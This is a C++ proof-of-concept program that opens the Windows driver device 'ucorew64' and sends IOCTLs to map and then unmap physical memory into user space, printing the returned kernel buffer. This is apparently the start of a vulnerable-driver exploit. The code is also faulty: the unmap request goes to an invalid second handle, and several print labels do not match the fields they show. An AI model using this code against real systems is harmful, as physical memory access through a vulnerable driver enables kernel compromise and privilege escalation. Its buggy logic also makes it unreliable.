#include <iostream>
#include <Windows.h>
//#include <ntstatus.h>

#define MapPhysicalMemoryToLinearSpace 0xFA002EE8
#define UnmapPhysicalMemory 0xFA002EEC
#define STATUS_SUCCESS 0x0

struct struct_buffer
{
    void* SectionHandle;
    DWORD offset;
    unsigned int BusAddress;
    PVOID PhysicalBaseAddress;
};

struct Phys32Struct
{
    HANDLE PhysicalMemoryHandle;
    SIZE_T dwPhysMemSizeInBytes;
    PVOID pvPhysAddress;
    PVOID pvPhysMemLin;
} ;
//source: https://github.com/ellysh/InpOut32/blob/fa28b483c4ab9e18f6d437fad390022181aa37f9/driver/hwinterfacedrv.h#L15


int main(char argc, char** argv)
{
    HANDLE device = INVALID_HANDLE_VALUE;
    NTSTATUS status = FALSE;
    DWORD bytesReturned = 0;
    struct Phys32Struct phys32Struct = { 0 };


    device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

    if (device == INVALID_HANDLE_VALUE)
    {
        printf("> Could not open device: 0x%X\n", GetLastError());
        return FALSE;
    }

    printf("[ ] Calling MapPhysicalMemoryToLinearSpace 0x%X\n", MapPhysicalMemoryToLinearSpace);
    status = DeviceIoControl(device, MapPhysicalMemoryToLinearSpace, &phys32Struct, sizeof(phys32Struct), &phys32Struct, sizeof(phys32Struct), &bytesReturned, (LPOVERLAPPED)NULL);
    if (status == FALSE) {
        printf("[!] MapPhysicalMemoryToLinearSpace failed with %X\n", status);
        return EXIT_FAILURE;
    }
    printf("[*] MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", MapPhysicalMemoryToLinearSpace);
    printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", phys32Struct, bytesReturned);
    /*
    printf("[*] inBuffer PhysicalBaseAddress: %p\n", inBuffer.PhysicalBaseAddress);
    printf("[*] inBuffer SectionHandle: %p\n", inBuffer.SectionHandle);
    */


    system("pause");

    HANDLE device2 = INVALID_HANDLE_VALUE;
    NTSTATUS status2 = FALSE;
    DWORD bytesReturned2 = 0;
    printf("phys32Struct.PhysicalBaseAddress: %X\n", phys32Struct.dwPhysMemSizeInBytes);
    printf("phys32Struct.BusAddress: %X\n", phys32Struct.PhysicalMemoryHandle);
    printf("phys32Struct.SectionHandle: %X\n", phys32Struct.pvPhysAddress);
    printf("phys32Struct.SectionHandle: %X\n", phys32Struct.pvPhysMemLin);

    printf("[ ] Calling UnmapPhysicalMemory 0x%X\n", UnmapPhysicalMemory);
    status = DeviceIoControl(device2, UnmapPhysicalMemory, &phys32Struct,
        sizeof(phys32Struct), NULL, 0, &bytesReturned2, (LPOVERLAPPED)NULL);
    if (status == FALSE) {
        printf("[!] UnmapPhysicalMemory failed with %X\n", status);
        return EXIT_FAILURE;
        //https://github.com/ellysh/InpOut32/blob/master/driver/hwinterfacedrv.c
    }
    printf("[*] UnmapPhysicalMemory 0x%X called successfully\n", MapPhysicalMemoryToLinearSpace);
    printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", bytesReturned2, bytesReturned2);

    system("pause");

    CloseHandle(device);
    return EXIT_SUCCESS;
}